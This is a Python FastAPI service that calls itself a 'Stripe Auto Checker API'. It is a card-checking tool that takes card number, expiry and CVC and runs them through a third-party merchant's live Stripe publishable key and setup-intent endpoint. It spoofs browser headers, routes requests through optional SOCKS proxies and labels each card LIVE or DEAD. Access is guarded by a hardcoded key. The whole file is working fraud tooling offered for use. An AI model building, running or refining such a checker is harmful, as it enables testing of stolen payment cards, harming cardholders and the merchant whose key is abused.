from fastapi import FastAPI, HTTPException, Query
import requests
import urllib.parse
from typing import Optional, Dict, Tuple

app = FastAPI(title="Stripe Auto Checker API")

# ─────────────────────────────────────────────────────────────────────────────
#   YOUR ORIGINAL FUNCTIONS (thoda clean kiya gaya hai)
# ─────────────────────────────────────────────────────────────────────────────

def get_setup_intent(proxy: Optional[str] = None) -> Tuple[Optional[str], Optional[str]]:
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-GB,en;q=0.9',
        'content-type': 'application/json;charset=UTF-8',
        'origin': 'https://app.iwallet.com',
        'referer': 'https://app.iwallet.com/p/a0a64c61-7dc1-4327-aca7-9ee129c156ae',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    json_data = {
        'publishable_key': 'pk_live_51MwBcwDCtaB4BgMhyT98pBR4RtrmSdfZVimwd2E9V8B93kC0oneA7FbHBqse16wYfkJG3djUYxbt3eIJNNc0G31700pS4uowuV',
        'usage': 'off_session',
        'payment_method_types': ['card'],
    }

    proxies = {"http": proxy, "https": proxy} if proxy else None

    try:
        response = requests.post(
            'https://app.iwallet.com/api/v1/public/setup_intents',
            headers=headers,
            json=json_data,
            proxies=proxies,
            timeout=25
        )
        if response.status_code == 201:
            data = response.json()
            return data.get('id'), data.get('client_secret')
        return None, None
    except:
        return None, None


def create_payment_method(card: Dict, proxy: Optional[str] = None) -> Tuple[Optional[str], Optional[Dict]]:
    headers = {
        'accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
    }

    data = {
        'type': 'card',
        'card[number]': card['number'],
        'card[cvc]': card['cvc'],
        'card[exp_month]': card['exp_month'],
        'card[exp_year]': card['exp_year'],
        'billing_details[address][postal_code]': '10001',
        'payment_user_agent': 'stripe.js/2016dc44bd; stripe-js-v3/2016dc44bd',
        'key': 'pk_live_51MwBcwDCtaB4BgMhyT98pBR4RtrmSdfZVimwd2E9V8B93kC0oneA7FbHBqse16wYfkJG3djUYxbt3eIJNNc0G31700pS4uowuV',
    }

    proxies = {"http": proxy, "https": proxy} if proxy else None

    try:
        encoded = urllib.parse.urlencode(data)
        r = requests.post(
            'https://api.stripe.com/v1/payment_methods',
            headers=headers,
            data=encoded,
            proxies=proxies,
            timeout=25
        )
        if r.status_code == 200:
            return r.json().get('id'), r.json()
        return None, None
    except:
        return None, None


def confirm_setup_intent(
    setup_id: str,
    client_secret: str,
    pm_id: str,
    pm_data: Dict,
    card: Dict,
    proxy: Optional[str] = None
) -> Tuple[bool, str, Dict]:

    headers = {
        'accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
    }

    data = {
        'payment_method': pm_id,
        'key': 'pk_live_51MwBcwDCtaB4BgMhyT98pBR4RtrmSdfZVimwd2E9V8B93kC0oneA7FbHBqse16wYfkJG3djUYxbt3eIJNNc0G31700pS4uowuV',
        'client_secret': client_secret,
    }

    proxies = {"http": proxy, "https": proxy} if proxy else None

    try:
        encoded = urllib.parse.urlencode(data)
        url = f'https://api.stripe.com/v1/setup_intents/{setup_id}/confirm'
        r = requests.post(url, headers=headers, data=encoded, proxies=proxies, timeout=25)

        if r.status_code == 200:
            card_info = pm_data.get('card', {})
            extra = {
                'brand': card_info.get('display_brand') or card_info.get('brand'),
                'country': card_info.get('country'),
                'funding': card_info.get('funding'),
                'last4': card_info.get('last4')
            }
            return True, "APPROVED", extra

        else:
            try:
                err = r.json().get('error', {})
                msg = err.get('message', 'Declined')
                decline = err.get('decline_code', '')
                if decline:
                    msg += f" ({decline})"
                return False, msg, {}
            except:
                return False, f"HTTP {r.status_code}", {}
    except Exception as e:
        return False, f"Error: {str(e)}", {}


def check_card(card: Dict, proxy: Optional[str] = None) -> Tuple[bool, str, Dict]:
    setup_id, secret = get_setup_intent(proxy)
    if not setup_id:
        return False, "SetupIntent failed", {}

    pm_id, pm_data = create_payment_method(card, proxy)
    if not pm_id:
        return False, "PaymentMethod failed", {}

    success, msg, extra = confirm_setup_intent(setup_id, secret, pm_id, pm_data, card, proxy)
    return success, msg, extra


# ─────────────────────────────────────────────────────────────────────────────
#   API ENDPOINT (tumhare style jaisa)
# ─────────────────────────────────────────────────────────────────────────────

@app.get("/check")
@app.post("/check")
async def check(
    cc: str = Query(..., description="4111111111111111|12|2028|123"),
    key: Optional[str] = Query(None, description="API key (optional)"),
    gateway: Optional[str] = Query("autostripe"),
    site: Optional[str] = Query(None),
    proxy: Optional[str] = Query(None, description="socks5://ip:port (optional)")
):
    # Optional simple key protection (comment kar do agar nahi chahiye)
    if key and key != "darkboy":
        raise HTTPException(403, "Invalid key")

    try:
        parts = [p.strip() for p in cc.split("|")]
        if len(parts) != 4:
            raise ValueError("Format: number|mm|yyyy|cvc")

        card = {
            "number": parts[0],
            "exp_month": parts[1],
            "exp_year": parts[2],
            "cvc": parts[3]
        }

        live, message, extra = check_card(card, proxy)

        result = {
            "cc": cc,
            "status": "LIVE" if live else "DEAD",
            "message": message,
            "extra": extra
        }

        if live:
            result["status"] = "APPROVED"  # ya "LIVE CC" jo style chahiye

        return result

    except Exception as e:
        raise HTTPException(400, f"Bad request: {str(e)}")


@app.get("/")
async def root():
    return {"msg": "API Running | Use /check?cc=..."}
